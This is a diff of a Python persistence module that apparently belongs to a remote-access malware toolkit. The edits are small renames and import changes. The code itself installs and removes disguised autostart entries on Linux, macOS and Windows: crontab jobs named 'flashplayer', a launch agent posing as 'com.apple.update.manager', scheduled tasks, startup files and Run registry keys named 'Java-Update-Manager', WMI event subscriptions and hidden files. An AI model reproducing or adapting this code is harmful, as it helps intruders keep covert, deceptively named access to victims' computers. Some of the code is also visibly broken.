@@ -17,7 +17,7 @@ if sys.platform == 'win32':
     import _winreg
 
 # utilities
-import core.util as util
+import util
 
 # globals
 packages = ['_winreg'] if sys.platform == 'win32' else []
@@ -107,7 +107,6 @@ class Method():
         else:
             raise OSError("Persistence method '{}' not compatible with {} platforms".format(self.name, sys.platform))
 
-
 def _add_hidden_file(value=None):
     try:
         value = sys.argv[0]
@@ -126,13 +125,12 @@ def _add_hidden_file(value=None):
         util.log(e)
     return (False, None)
 
-
 def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
     try:
         if sys.platform == 'linux2':
             value = sys.argv[0]
             if value and os.path.isfile(value):
-                if not methods['crontab_job'].established:
+                if not _methods['crontab_job'].established:
                     user = os.getenv('USERNAME', os.getenv('NAME'))
                     task = "0 */6 * * * {} {}".format(60/minutes, user, path)
                     with open('/etc/crontab', 'r') as fp:
@@ -146,7 +144,6 @@ def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
     except Exception as e:
         util.log("{} error: {}".format(_add_crontab_job.func_name, str(e)))
     return (False, None)
-
 
 def _add_launch_agent(value=None, name='com.apple.update.manager'):
     try:
@@ -179,10 +176,9 @@ def _add_launch_agent(value=None, name='com.apple.update.manager'):
         util.log('Error: {}'.format(str(e2)))
     return (False, None)
 
-
 def _add_scheduled_task(value=None, name='Java-Update-Manager'):
     try:
-        if os.name == 'nt' and not methods['scheduled_task'].established:
+        if os.name == 'nt' and not _methods['scheduled_task'].established:
             value = sys.argv[0]
             name  = util.variable(random.randint(6,11))
             if value and os.path.isfile(value):
@@ -193,10 +189,9 @@ def _add_scheduled_task(value=None, name='Java-Update-Manager'):
         util.log('Add scheduled task error: {}'.format(str(e)))
     return (False, None)
 
-
 def _add_startup_file(value=None, name='Java-Update-Manager'):
     try:
-        if os.name == 'nt' and not methods['startup_file'].established:
+        if os.name == 'nt' and not _methods['startup_file'].established:
             value = sys.argv[0]
             if value and os.path.isfile(value):
                 appdata = os.path.expandvars("%AppData%")
@@ -213,10 +208,9 @@ def _add_startup_file(value=None, name='Java-Update-Manager'):
         util.log('{} error: {}'.format(_add_startup_file.func_name, str(e)))
     return (False, None)
 
-
 def _add_registry_key(value=None, name='Java-Update-Manager'):
     try:
-        if os.name == 'nt' and not methods['registry_key'].established:
+        if os.name == 'nt' and not _methods['registry_key'].established:
             value = sys.argv[0]
             if value and os.path.isfile(value):
                 try:
@@ -228,10 +222,9 @@ def _add_registry_key(value=None, name='Java-Update-Manager'):
         util.log('{} error: {}'.format(_add_registry_key.func_name, str(e)))
     return (False, None)
 
-
 def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
     try:
-        if os.name == 'nt' and not methods['powershell_wmi'].established:
+        if os.name == 'nt' and not _methods['powershell_wmi'].established:
             cmd_line  = ""
             value = sys.argv[0]
             if value and os.path.isfile(value):
@@ -250,21 +243,19 @@ def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
         util.log('{} error: {}'.format(_add_powershell_wmi.func_name, str(e)))
     return (False, None)
 
-
 def _remove_scheduled_task():
-    if methods['scheduled_task'].established:
-        value = methods['scheduled_task'].result
+    if _methods['scheduled_task'].established:
+        value = _methods['scheduled_task'].result
         try:
              if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(value), shell=True) == 0:
                  return (False, None)
         except: pass
-    return (methods['scheduled_task'].established, methods['scheduled_task'].result)
-
+    return (_methods['scheduled_task'].established, _methods['scheduled_task'].result)
 
 def _remove_hidden_file():
     try:
-        if methods['hidden_file'].established:
-            filename = methods['hidden_file'].result
+        if _methods['hidden_file'].established:
+            filename = _methods['hidden_file'].result
             if os.path.isfile(filename):
                 try:
                     unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
@@ -274,12 +265,11 @@ def _remove_hidden_file():
                     util.log('{} error: {}'.format(_remove_hidden_file.func_name, str(e1)))
     except Exception as e2:
         util.log('{} error: {}'.format(_remove_hidden_file.func_name, str(e2)))
-    return (methods['hidden_file'].established, methods['hidden_file'].result)
-
+    return (_methods['hidden_file'].established, _methods['hidden_file'].result)
 
 def _remove_crontab_job(value=None, name='flashplayer'):
     try:
-        if sys.platform == 'linux2' and methods['crontab_job'].established:
+        if sys.platform == 'linux2' and _methods['crontab_job'].established:
             with open('/etc/crontab','r') as fp:
                 lines = [i.rstrip() for i in fp.readlines()]
                 for line in lines:
@@ -290,24 +280,22 @@ def _remove_crontab_job(value=None, name='flashplayer'):
         return (False, None)
     except Exception as e:
         util.log('{} error: {}'.format(_remove_crontab_job.func_name, str(e)))
-    return (methods['hidden_file'].established, methods['hidden_file'].result)
-
+    return (_methods['hidden_file'].established, _methods['hidden_file'].result)
 
 def _remove_launch_agent(value=None, name='com.apple.update.manager'):
     try:
-        if methods['launch_agent'].established:
+        if _methods['launch_agent'].established:
             launch_agent = persistence['launch_agent'].result
             if os.path.isfile(launch_agent):
                 util.delete(launch_agent)
                 return (False, None)
     except Exception as e:
         util.log("{} error: {}".format(_remove_launch_agent.func_name, str(e)))
-    return (methods['launch_agent'].established, methods['launch_agent'].result)
-
+    return (_methods['launch_agent'].established, _methods['launch_agent'].result)
 
 def _remove_powershell_wmi(value=None, name='Java-Update-Manager'):
     try:
-        if methods['powershell_wmi'].established:
+        if _methods['powershell_wmi'].established:
             try:
                 code = r"""
                 Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'",  Remove-WmiObject
@@ -317,31 +305,29 @@ def _remove_powershell_wmi(value=None, name='Java-Update-Manager'):
                 if not result:
                     return (False, None)
             except: pass
-        return (methods['powershell_wmi'].established, methods['powershell_wmi'].result)
+        return (_methods['powershell_wmi'].established, _methods['powershell_wmi'].result)
     except Exception as e:
         util.log('{} error: {}'.format(_add_powershell_wmi.func_name, str(e)))
-    return (methods['powershell_wmi'].established, methods['powershell_wmi'].result)
+    return (_methods['powershell_wmi'].established, _methods['powershell_wmi'].result)
     
-
 def _remove_registry_key(value=None, name='Java-Update-Manager'):
     try:
-        if methods['registry_key'].established:
-            value = methods['registry_key'].result
+        if _methods['registry_key'].established:
+            value = _methods['registry_key'].result
             try:
                 key = OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, _winreg.KEY_ALL_ACCESS)
                 _winreg.DeleteValue(key, name)
                 _winreg.CloseKey(key)
                 return (False, None)
             except: pass
-        return (methods['registry_key'].established, methods['registry_key'].result)
+        return (_methods['registry_key'].established, _methods['registry_key'].result)
     except Exception as e:
         util.log(str(e))
 
-
 def _remove_startup_file():
     try:
-        if methods['startup_file'].established:
-            value = methods['startup_file'].result
+        if _methods['startup_file'].established:
+            value = _methods['startup_file'].result
             if value and os.path.isfile(value):
                 if os.name != 'nt':
                     return (False, None)
